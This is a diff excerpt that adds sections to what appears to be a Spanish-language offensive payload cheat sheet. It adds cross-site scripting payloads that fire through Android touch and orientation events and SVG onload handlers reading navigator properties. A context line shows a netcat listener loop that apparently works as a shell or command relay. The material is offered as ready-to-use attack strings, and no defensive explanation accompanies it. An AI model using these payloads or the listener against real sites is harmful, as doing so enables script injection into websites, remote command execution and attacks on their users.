@@ -306,6 +306,34 @@ while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
 
 ```
 
+# xss en android 
+
+```
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchcancel=alert(1)>
+<body onorientationchange=alert(1)>
+<svg onload=alert(navigator.connection.type)>
+
+```
+
+## xss javascript navigator  
+
+```
+<svg onload=alert(navigator.appCodeName)>
+<svg onload=alert(navigator.appName)>
+<svg onload=alert(navigator.appVersion)>
+<svg onload=alert(navigator.cookieEnabled)>
+<svg onload=alert(navigator.language)>
+<svg onload=alert(navigator.onLine)>
+<svg onload=alert(navigator.platform)>
+<svg onload=alert(navigator.userAgent)>
+
+```
+
+
+
 Muchos mas:
 
 ```
